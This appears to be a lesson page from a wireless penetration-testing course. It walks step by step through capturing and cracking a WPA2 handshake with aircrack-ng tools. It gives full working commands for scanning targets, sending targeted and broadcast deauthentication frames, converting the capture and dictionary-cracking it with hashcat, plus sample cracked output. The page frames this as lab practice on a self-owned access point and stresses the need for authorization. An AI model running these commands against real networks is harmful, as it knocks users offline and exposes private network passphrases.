Three tools, one line of attack: find the target, knock a client off so it reconnects, catch the handshake it sends on the way back, then crack it on your GPU. This is the whole aircrack-ng workflow, and it is the single most-run wireless attack in the field. Set up a WPA2 test AP with a passphrase from `rockyou.txt` and follow along against that.

Start in monitor mode from the first lesson. Confirm `wlan0mon` is up with `iw dev`, then survey the air to pick a target.

## Find the target

<CommandCard command="sudo airodump-ng wlan0mon" title="attacker@kali" explain="Scans all channels and lists every AP in range: BSSID, channel (CH), encryption (ENC), and SSID. Note your target's BSSID and channel, then Ctrl-C." />

You want three facts: the AP's **BSSID**, its **channel**, and ideally the MAC of one associated client (shown in the STATION column of the lower table). Now lock airodump to that channel and BSSID and write to a file. Locking the channel is not optional. Hopping across channels while you wait for a handshake is how captures get missed.

<CommandBlock
  title="attacker@kali"
  commands={[
    { cmd: "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon", comment: "channel 6, one BSSID, save to capture-01.cap" },
  ]}
/>

Leave that running. The top-right of the screen shows a WPA handshake banner the moment you catch one. To get it fast, you make a client reconnect.

## Force the handshake

A deauth frame tells a client to disconnect. It reassociates within seconds and the four-way handshake replays, right into your open capture. In a second terminal:

<CommandBlock
  title="attacker@kali"
  commands={[
    { cmd: "sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon", comment: "5 deauths, -a AP, -c target client MAC" },
    { cmd: "sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon", comment: "no -c: broadcast deauth to every client, use if you have no station MAC" },
  ]}
/>

Send a small burst, five is plenty. Prefer the targeted `-c` version: it hits one device instead of knocking everyone off, which is quieter and less disruptive. Watch the airodump window for `WPA handshake: AA:BB:CC:DD:EE:FF` in the top corner. That is your capture. Stop airodump.

<Callout type="warning" title="No handshake showing up?">
Common causes: no client was actually connected (a deauth with no victim produces nothing), you were on the wrong channel, or your card cannot inject. Verify injection with `sudo aireplay-ng --test wlan0mon`. If it reports 0 packets injected, the chipset or driver is the problem, not your commands.
</Callout>

## Crack it

Modern hashcat wants the 22000 format, not the raw `.cap`. Convert it with hcxpcapngtool, then run it. Mode 22000 is WPA-PBKDF2-PMKID+EAPOL, the current mode for both handshake and PMKID captures.

<CommandBlock
  title="attacker@kali"
  commands={[
    { cmd: "hcxpcapngtool -o hash.22000 capture-01.cap", comment: "convert the capture to hashcat's 22000 format" },
    { cmd: "hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt", comment: "straight dictionary attack" },
    { cmd: "hashcat -m 22000 hash.22000 --show", comment: "print the cracked passphrase once it is done" },
  ]}
/>

<ExpectedOutput label="A hit looks like this">
```
AA...FF:11...66:HomeNet:hunter2springs
Status...........: Cracked
```
</ExpectedOutput>

If you prefer the classic tool, `aircrack-ng -w rockyou.txt capture-01.cap` cracks straight from the `.cap` on CPU. It works, but hashcat on a GPU is an order of magnitude faster and takes rules, which the next module covers. Reach for hashcat.

The passphrase either falls to your wordlist in minutes or it does not fall at all. That is the honest outcome of WPA2 cracking: it beats reused and human-memorable passwords and loses to random ones. Your job on an engagement is to prove the network runs the former.

<Callout type="security" title="Only test networks you own">
Deauthentication is an active denial-of-service against every client you hit, and capturing a handshake is interception. Run this entire pipeline only against an AP you own or one named in a signed authorization. There is no gray area here.
</Callout>
